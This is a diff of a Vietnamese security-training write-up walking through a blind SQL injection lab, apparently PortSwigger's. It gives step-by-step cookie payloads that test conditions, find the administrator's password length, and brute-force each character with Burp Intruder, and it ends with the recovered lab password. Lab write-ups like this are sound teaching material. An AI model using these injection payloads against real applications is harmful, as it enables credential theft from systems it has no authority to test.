@@ -250,37 +250,53 @@ Tiêm SQL mù là dạng SQL injection mà ứng dụng bị lỗ hổng nhưng 
 
 Phòng thí nghiệm có lỗ hổng SQL injection mù qua cookie. Ứng dụng dùng giá trị cookie để truy vấn, không trả về kết quả hay lỗi, nhưng hiển thị thông báo "Welcome back" nếu có dữ liệu. Cơ sở dữ liệu có bảng users với cột username và password. Mục tiêu là khai thác lỗ hổng để lấy mật khẩu của tài khoản administrator và đăng nhập thành công.
 
-Bước 1: Thay đổi `TrackingId = lymgpqdLQyOrztR3` thành `TrackingId=lymgpqdLQyOrztR3' AND '1'='1` -> Tin nhắn `Welcome back` xuất hiện
+Bước 1: Thay đổi `TrackingId = 7ME7rwXxPnGRU69q` thành `TrackingId=7ME7rwXxPnGRU69q' AND '1'='1` -> Tin nhắn `Welcome back` xuất hiện
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a5836108-9859-4b59-ad21-34bd02d708ea" />
-Bước 2 đổi thành `TrackingId=lymgpqdLQyOrztR3' AND '1'='2 ` -> -> Tin nhắn `Welcome back` không xuất hiện
+Bước 2 đổi thành `TrackingId=7ME7rwXxPnGRU69q' AND '1'='2 ` -> Tin nhắn `Welcome back` không xuất hiện
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f376d7b9-46c3-4aa7-9dd2-db0ff014b8e8" />
-Bước 3: Đổi thành `TrackingId=lymgpqdLQyOrztR3' AND (SELECT 'a' FROM users LIMIT 1)='a`
+Bước 3: Đổi thành `TrackingId=7ME7rwXxPnGRU69q' AND (SELECT 'a' FROM users LIMIT 1)='a`
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f1cf2772-8ceb-40d3-a5b2-9693fbafaf10" />
 Có tin nhắn Welcome back xác minh rằng điều kiện là đúng, xác nhận rằng có một bảng có tên là `users`.
 
-Bước 4: Đổi thành `TrackingId=lymgpqdLQyOrztR3' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
+Bước 4: Đổi thành `TrackingId=7ME7rwXxPnGRU69q' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5a3eb08f-b92f-4998-b6bb-493853bccd6d" />
 Có tin nhắn Welcome back xác minh rằng điều kiện là đúng, xác nhận rằng có một người dùng được gọi là `administrator`
 
 Bước 5: Bước tiếp theo là xác định số ký tự trong mật khẩu của administrator. Đổi thành 
 
-`TrackingId=lymgpqdLQyOrztR3' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
+`TrackingId=7ME7rwXxPnGRU69q' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/341b6858-cf59-4c53-b67c-2d05340b0cd7" />
 Điều kiện này phải đúng, xác nhận rằng mật khẩu dài hơn 1 ký tự.
 
 Bước 6: 
 Gửi một loạt giá trị theo dõi để kiểm tra độ dài mật khẩu khác nhau
 
-`TrackingId=lymgpqdLQyOrztR3' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
+`TrackingId=7ME7rwXxPnGRU69q' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/66ecec92-a861-4305-ad3a-d64a58374891" />
 Tiếp tục thay đổi giá trị để xác định độ dài của mật khẩu:
 
-`TrackingId=lymgpqdLQyOrztR3' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a`
+`TrackingId=7ME7rwXxPnGRU69q' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a`
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2affdd0a-b9be-42ef-ab1a-554e02c1f54b" />
 **Xác định được độ dài của mật khẩu, thực tế là 20 ký tự**
 
-Bước 7: Trong Intruder: `TrackingId=lymgpqdLQyOrztR3' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
+**Xác định giá trị kí tự tại mỗi vị trí**
+Bước 7: Trong Intruder: 
+`TrackingId=0Ng3V1e3t5uRTDir' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
+`SUBSTRING()` để trích xuất một ký tự duy nhất từ ​​mật khẩu và kiểm tra nó với một giá trị cụ thể. Ta sẽ kiểm tra từng vị trí và giá trị có khả năng, lần lượt kiểm tra từng giá trị
 
+Bước 8: Thêm § xung quanh `a` và 1 trong giá trị cookie- lấy ký tự thứ `$1$` trong mật khẩu của administrator và so sánh với `$a$`. Chọn cluster bomb attack.Trong Payloads.Chọn lần lượt `1-1`, `Numbers`, `From: 1`, `To: 20`, `Step: 1`
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7c019ab2-c8e9-45f4-a746-9de3a3b7d745" />
+- Payload 1: số thứ tự cột cần lấy ký tự (1 → 20).
+- Payload 2: brute force từng ký tự (a–z, 0–9).
+
+Bước 9: Trong Payloads, đổi thành `2-a`, `Brute-Force`, `Min length: 1`, `Max-lenght:1`
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2ed38c5d-3ce1-4c1a-923b-e17af5a27a80" />
+- Payload 1: số thứ tự từ 1 đến 20 (vị trí ký tự trong chuỗi).
+- Payload 2: brute force ký tự với tập ký tự `abcdefghijklmnopqrstuvwxyz0123456789`
+
+Bước 10:  hãy nhấp vào Tab Cài đặt để mở bảng điều khiển bên Cài đặt . Trong phần Grep - Match , hãy xóa các mục hiện có trong danh sách, sau đó thêm giá trị Welcome back. Click bắt đầu tấn công.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a404339a-8707-4290-a954-c3e64482ac82" />
+Các giá trị có payload 1 thứ tự 1 đến 20 có tick `Welcome back` là mật khẩu của administrator: `ty759g6ajl40wnvytqg6`
 
 ###### 2.1.5.2 SQLi dựa trên lỗi
 - Kịch bản phổ biến
